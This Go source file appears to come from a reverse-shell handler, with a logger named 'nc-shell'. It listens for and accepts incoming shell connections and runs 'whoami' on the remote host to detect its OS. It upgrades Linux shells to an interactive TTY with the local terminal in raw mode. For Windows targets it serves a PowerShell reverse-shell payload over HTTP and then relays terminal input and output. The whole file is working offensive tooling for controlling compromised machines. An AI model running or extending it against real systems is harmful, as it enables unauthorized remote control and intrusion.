package terminal

import (
	"net"
	"os"
	"runtime"
	"strings"
	"sync"

	"github.com/op/go-logging"
)

var STTY_ROWS string
var STTY_COLS string
var STTY_SIZE string
var SPAWN_TTY string

type Terminal struct {
	OS      string
	Con     net.Conn
	Options struct {
		Port  int
		Debug bool
	}
	rows     string
	cols     string
	spawnTTY string
	mutex    sync.Mutex
	listener net.Listener
	log      *logging.Logger
}

func (terminal *Terminal) New() {
	terminal.logging()
	listenAndAcceptConnection(terminal)
}

func (terminal *Terminal) logging() {
	terminal.log = logging.MustGetLogger("nc-shell")

	logger := logging.NewLogBackend(os.Stderr, "", 0)
	var loggerLeveled logging.LeveledBackend

	if terminal.Options.Debug {
		// \033[999 trick to reset the position of the cursor when the terminal is with stty raw -echo
		var format = logging.MustStringFormatter(
			"\033[999D%{color}%{time:15:04:05.000} %{longpkg} ▶ %{level} %{message} %{color:reset}",
		)
		loggerFormatter := logging.NewBackendFormatter(logger, format)
		loggerLeveled = logging.AddModuleLevel(loggerFormatter)
		loggerLeveled.SetLevel(logging.DEBUG, "")
	} else {
		var format = logging.MustStringFormatter(
			`%{color}%{time:15:04:05} %{color:reset} %{message}`,
		)

		loggerFormatter := logging.NewBackendFormatter(logger, format)
		loggerLeveled = logging.AddModuleLevel(loggerFormatter)
		loggerLeveled.SetLevel(logging.INFO, "")
	}

	// Set the backends to be used.
	logging.SetBackend(loggerLeveled)

}

func (terminal *Terminal) GetOS() {
	//Use env ou set command and parse outptut
	output := terminal.execute("whoami")
	if strings.Contains(string(output), "\\") {
		terminal.OS = "windows"
	} else {
		terminal.OS = "linux"
	}
	//fmt.Println(string(execute("env", dst)))

}

func (terminal *Terminal) Shell() {
	defer func() {
		if runtime.GOOS == "linux" {
			terminal.sttyRawEcho("disable")
		}
	}()
	if terminal.OS == "linux" {
		// If the main binary is running on linux
		if runtime.GOOS == "linux" {
			// Set the terminal to raw mode
			terminal.sttyRawEcho("enable")
			terminal.setSpawnTTY()
		}
		terminal.interactiveReverseShellLinux()

	} else if terminal.OS == "windows" {
		// If the main binary is running on linux
		if runtime.GOOS == "linux" {
			// Set the terminal to raw mode
			terminal.sttyRawEcho("enable")
		}
		terminal.interactiveReverseShellWindows()
		terminal.log.Debug("Starting http server on " + terminal.Con.LocalAddr().String())
		terminal.serveHTTPRevShellPowershell()
		listenAndAcceptConnection(terminal)

	}
	chan_to_stdout := terminal.stream_copy(terminal.Con, os.Stdout, false)
	chan_to_remote := terminal.stream_copy(os.Stdin, terminal.Con, true)
	select {
	case <-chan_to_stdout:
		terminal.log.Debug("Remote connection is closed")

	case <-chan_to_remote:
		terminal.log.Debug("Local program is terminated")

	}

}
